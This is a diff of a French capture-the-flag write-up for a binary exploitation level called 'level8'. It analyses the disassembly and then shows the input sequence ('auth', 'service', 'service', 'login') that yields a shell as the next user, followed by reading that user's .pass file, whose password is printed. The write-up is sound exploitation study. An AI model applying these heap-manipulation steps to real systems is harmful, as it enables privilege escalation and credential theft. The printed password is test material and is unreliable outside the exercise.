@@ -144,7 +144,29 @@ Dump of assembler code for function main:
    0x08048737 <+467>:	pop    %ebp
    0x08048738 <+468>:	ret
 
-Nous remarquons un appel a printf("%p, %p \n", auth, service) auth et service etant deux variables nul, le modifier %p voulant afficher une adresse affich (nil), (nil).
-Juste apres l'appel a printf nous voyons un appel a la fonction fgets
-Chose remarquable, lorsque nous passons service a fgets, le printf nous renvoie une adresse : 0x0804a008. Cette adresse s'incremente a chaque nouvel appel de fgets avec service comme argument de 0x10.
-Toutes ces adresses contiennent la valeur '\n' ou 0x0000000a
+Nous remarquons aussi 4 commandes qui semblent importantes : "auth " "service" "reset" et "login"
+
+Nous remarquons un appel a printf("%p, %p \n", auth, service) auth et service etant deux variables nul, le modifier %p voulant afficher une adresse affiche (nil), (nil), respectivement les adresse de auth et de service.
+
+A chaque appel a auth et a service leur adresse sont incrementee de 0x10 grace au malloc.
+Chose interessante, juste avant l'appel a system nous remarquons cette ligne :
+
+   0x080486e7 <+387>:	mov    0x20(%eax),%eax
+   0x080486ea <+390>:	test   %eax,%eax
+
+Il va donc y avoir une comparaison entre les adresses de auth et de service et une difference de 0x20 est attendue.
+
+Quand nous essayons d'incrementer auth de 0x20 de plus que service cela ne marche pas, mais l'inverse fonctionne :
+
+./level8
+auth 
+service
+service
+login
+$ whoami
+level9
+$ cd ../level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
+
